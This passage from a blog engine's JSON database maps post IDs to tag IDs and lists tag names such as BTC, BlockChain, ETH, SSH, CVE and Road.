64g1l8y","_id":"clz7mrmjy000m8wun3b5v1i6i"},{"post_id":"clz7mrmjv000c8wun9406chp4","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmjz000o8wun4qiu4wqo"},{"post_id":"clz7mrmjx000h8wun6pkp6d1c","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk0000s8wun9k6c4bz1"},{"post_id":"clz7mrmjx000h8wun6pkp6d1c","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk1000u8wunbqrue300"},{"post_id":"clz7mrmjy000l8wung6bifeqa","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk2000z8wun13cndnql"},{"post_id":"clz7mrmjy000l8wung6bifeqa","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk300128wunaagg756a"},{"post_id":"clz7mrmjo00038wunhibl6t3w","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk400178wun1wzj6m6m"},{"post_id":"clz7mrmjo00038wunhibl6t3w","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk4001a8wunf47j0mm5"},{"post_id":"clz7mrmjz000n8wun0ci33yap","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk5001f8wun2e1dfrnp"},{"post_id":"clz7mrmjz000n8wun0ci33yap","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk6001i8wun6mfv293j"},{"post_id":"clz7mrmk0000r8wun9muh25tl","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk7001m8wun5mhg2go8"},{"post_id":"clz7mrmk0000r8wun9muh25tl","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk7001o8wuncjvh268j"},{"post_id":"clz7mrmk1000t8wunf78x90u1","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk7001s8wunan4bb5yd"},{"post_id":"clz7mrmk1000t8wunf78x90u1","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk7001u8wun48x4bc1w"},{"post_id":"clz7mrmk2000y8wun9vt7bvp7","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk8001y8wunc9inhmj5"},{"post_id":"clz7mrmk2000y8wun9vt7bvp7","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk800208wunaamgg65z"},{"post_id":"clz7mrmjr00068wun88hh96q1","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz7mrmk800248wunb83f8k5i"},{"post_id":"clz7mrmjr00068wun88hh96q1","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk800268wunbgnd048o"},{"post_id":"clz7mrmk200118wungvif75p0","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk9002a8wun1vxm2wd1"},{"post_id":"clz7mrmk200118wungvif75p0","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmk9002c8wun1di73u14"},{"post_id":"clz7mrmk300168wune9g57jzv","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmk9002g8wunh1e1f9r2"},{"post_id":"clz7mrmk300168wune9g57jzv","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmka002i8wun1jld34t8"},{"post_id":"clz7mrmjs00078wunalxqac9h","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmka002l8wun9luz8cmd"},{"post_id":"clz7mrmjs00078wunalxqac9h","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmka002n8wunh53r3bgq"},{"post_id":"clz7mrmjs00088wun506p359v","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz7mrmka002q8wun1h2tfpyb"},{"post_id":"clz7mrmjs00088wun506p359v","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmka002s8wungugp2f8d"},{"post_id":"clz7mrmju000b8wungz0jbjk0","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz7mrmka002u8wun6eczhw4g"},{"post_id":"clz7mrmju000b8wungz0jbjk0","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmkb002x8wun5das48ue"},{"post_id":"clz7mrmjw000f8wun2ahee70y","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmkb002z8wuna9pxd4ya"},{"post_id":"clz7mrmjw000f8wun2ahee70y","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz7mrmkb00328wun8qj61a1k"},{"post_id":"clz7mrmk400198wuneq1y19t5","tag_id":"clz7mrmk800238wun2u2i19aa","_id":"clz7mrmkb00348wunay1r5zf5"},{"post_id":"clz7mrmk5001e8wunawo84hk9","tag_id":"clz7mrmk800238wun2u2i19aa","_id":"clz7mrmkb00368wun7gl188d8"},{"post_id":"clz8lvt0h0000isundtyc1zql","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz8lvt0r0001isunde6v0cnb"},{"post_id":"clz8lvt0h0000isundtyc1zql","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz8lvt0s0003isunfwfd9t67"},{"post_id":"clz8lvt0r0002isun9gvmetmt","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz8lvt0t0006isund7kl7tww"},{"post_id":"clz8lvt0r0002isun9gvmetmt","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz8lvt0t0008isun8hpn9bp1"},{"post_id":"clz8lvt0s0004isunebc50jvr","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz8lvt0t000aisunaha76rgf"},{"post_id":"clz8lvt0s0004isunebc50jvr","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clz8lvt0t000cisun40h3f623"},{"post_id":"clza14odc000084ungszc1wff","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clza14ode000284un0neq6c4t"},{"post_id":"clza14odc000084ungszc1wff","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clza14odf000484un2z0kgnfu"},{"post_id":"clza14odd000184un9na7518i","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clza14odf000784un7nwg1hnh"},{"post_id":"clza14odd000184un9na7518i","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clza14odg000984uncz52flru"},{"post_id":"clza14ode000384un14f7e73l","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clza14odh000c84un7krv9pbc"},{"post_id":"clza14ode000384un14f7e73l","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clza14odi000f84un1qi50ptp"},{"post_id":"clza14odf000584un0vfndc9t","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clza14odi000h84unbd0r5r9f"},{"post_id":"clza14odf000584un0vfndc9t","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clza14odi000j84una1547v0r"},{"post_id":"clza14odg000a84un3wvi3chw","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clza14odj000l84un77bpgrrx"},{"post_id":"clza14odg000a84un3wvi3chw","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clza14odj000n84unh3nm7rzg"},{"post_id":"clza14odh000d84un050wh05s","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clza14odj000p84undrhrgctv"},{"post_id":"clza14odh000d84un050wh05s","tag_id":"clz7mrmjz000q8wungf81fy8x","_id":"clza14odj000r84un707fasgj"},{"post_id":"clzbh821600002sundcwrhcyf","tag_id":"clz7mrmk9002f8wun7u9jf602","_id":"clzbh821e00022sun9lna15us"},{"post_id":"clzbh821l00082sune5oc8lrr","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821o000d2sun0lz8fw0x"},{"post_id":"clzbh821l00082sune5oc8lrr","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821p000f2sun1f0113gn"},{"post_id":"clzbh821c00012sun8lhg3dra","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821r000k2sunexu2amxu"},{"post_id":"clzbh821c00012sun8lhg3dra","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821r000n2sun3u22asxo"},{"post_id":"clzbh821m000a2sunffek0ri9","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821s000q2sungyejhxkn"},{"post_id":"clzbh821m000a2sunffek0ri9","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821t000s2sun5unca0k4"},{"post_id":"clzbh821o000e2sunfz46epd7","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821t000u2sunc6tc6t8h"},{"post_id":"clzbh821o000e2sunfz46epd7","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821t000w2suncgfj4kmw"},{"post_id":"clzbh821e00032sun4x4xe0am","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821t000y2sundlfc1ds5"},{"post_id":"clzbh821e00032sun4x4xe0am","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821t00102sunfyg62rdl"},{"post_id":"clzbh821p000g2sundurqeh3s","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821t00122sun9qcsgp77"},{"post_id":"clzbh821p000g2sundurqeh3s","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821t00142sunha2c4anw"},{"post_id":"clzbh821r000l2suneueq2wa7","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821t00162sung36aeac5"},{"post_id":"clzbh821r000l2suneueq2wa7","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821t00182sun7enuafah"},{"post_id":"clzbh821i00052sun4p2wc313","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821u001a2sun8todcbs5"},{"post_id":"clzbh821i00052sun4p2wc313","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821u001c2sun7cpz4usq"},{"post_id":"clzbh821s000o2sun28qs95e0","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzbh821u001e2sun8mw5cq8l"},{"post_id":"clzbh821s000o2sun28qs95e0","tag_id":"clzbh821f00042sunc9hpbeec","_id":"clzbh821u001g2sundxegh6zn"},{"post_id":"clzju0hn700006suna6v8a1qr","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clzju0hnd00016sunes4417vr"},{"post_id":"clzju0hn700006suna6v8a1qr","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clzju0hnd00026sun2g7qgoxa"}],"Tag":[{"name":"BTC","_id":"clz7mrmjr00058wun664g1l8y"},{"name":"BlockChain","_id":"clz7mrmjt000a8wunan0ib53j"},{"name":"ETH","_id":"clz7mrmjz000q8wungf81fy8x"},{"name":"SSH","_id":"clz7mrmk800238wun2u2i19aa"},{"name":"CVE","_id":"clz7mrmk9002f8wun7u9jf602"},{"name":"Road","_id":"clzbh821f00042sunc9hpbeec"}]}}